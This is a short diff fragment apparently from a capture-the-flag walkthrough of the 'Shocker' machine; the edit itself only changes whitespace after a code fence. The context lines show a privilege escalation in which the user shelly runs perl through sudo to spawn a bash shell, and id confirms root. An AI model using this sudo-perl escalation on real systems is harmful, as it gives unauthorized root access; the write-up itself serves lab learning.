@@ -190,4 +190,4 @@ shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e "exec('/bin/bash')"
 sudo /usr/bin/perl -e "exec('/bin/bash')"
 id
 uid=0(root) gid=0(root) groups=0(root)
-```
+``` 
